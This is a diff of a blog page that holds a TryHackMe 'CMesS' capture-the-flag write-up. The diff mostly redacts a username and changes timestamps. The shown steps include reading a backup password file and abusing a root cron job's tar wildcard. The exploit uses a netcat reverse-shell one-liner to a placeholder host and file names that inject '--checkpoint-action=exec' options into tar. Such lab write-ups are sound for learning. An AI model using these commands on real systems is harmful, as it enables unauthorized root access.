@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="n3ird4">
 <meta property="og:description" content="Hey THM is pretty cool though so let’s have fun with this CMesS room First hint: Please also note that this box does not require brute forcing! A quick rustscan scan gave me only 2 open ports: 123PORT">
 <meta property="og:locale" content="fr">
-<meta property="og:updated_time" content="2021-11-05T15:01:05.662Z">
+<meta property="og:updated_time" content="2021-11-05T15:03:25.108Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TryHackMe CMesS CTF Write Up">
 <meta name="twitter:description" content="Hey THM is pretty cool though so let’s have fun with this CMesS room First hint: Please also note that this box does not require brute forcing! A quick rustscan scan gave me only 2 open ports: 123PORT">
@@ -122,7 +122,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cd opt</span><br><span class="line">ls</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb  6  2020 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Feb  6  2020 ..</span><br><span class="line">-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak</span><br><span class="line">cat .password.bak</span><br><span class="line">xxxx backup password</span><br><span class="line">U&lt;redacted&gt;6</span><br><span class="line"></span><br><span class="line">su - xxxx</span><br><span class="line">cat user.txt</span><br><span class="line">thm&#123;&lt;redactedflag&gt;&#125;</span><br><span class="line">xxxx@cmess:~$</span><br></pre></td></tr></table></figure>
 <p>I connected via ssh to get a better shell and obviously password was the same…<br>Had a quick look over /tmp and found a backup.tar.gz </p>
 <p>It was related to the following cron task:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/2 *   * * *   root    cd /home/andre/backup &amp;&amp; tar -zcf /tmp/andre_backup.tar.gz *</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/2 *   * * *   root    cd /home/xxxx/backup &amp;&amp; tar -zcf /tmp/xxxx_backup.tar.gz *</span><br></pre></td></tr></table></figure>
 <p>Thanks to <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" target="_blank" rel="noopener">hackingarticles</a> exploit was easy as:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxxx@cmess:~/backup$ cat shell.sh </span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc X.X.X.X 4242 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">xxxx@cmess:~/backup$ ls -lrt</span><br><span class="line">total 20</span><br><span class="line">-rwxr-x--- 1 xxxx xxxx 52 Nov  1 05:47 note</span><br><span class="line">-rw-rw-r-- 1 xxxx xxxx 80 Nov  1 06:03 shell.sh</span><br><span class="line">-rw-rw-r-- 1 xxxx xxxx  1 Nov  1 06:04 --checkpoint-action=exec=sh shell.sh</span><br><span class="line">-rw-rw-r-- 1 xxxx xxxx  1 Nov  1 06:04 --checkpoint=1</span><br></pre></td></tr></table></figure>
 <p>And 🥁  Hourra ! </p>
@@ -132,7 +132,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://91.208.181.214/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/" data-id="ckvmi9ohh00359ciytzucrb5c" class="article-share-link">Partager</a>
+      <a data-url="http://91.208.181.214/2021/11/05/TryHackMe-CMesS-CTF-Write-Up/" data-id="ckvmidhy80031hjiy27tz24yf" class="article-share-link">Partager</a>
       
       
       
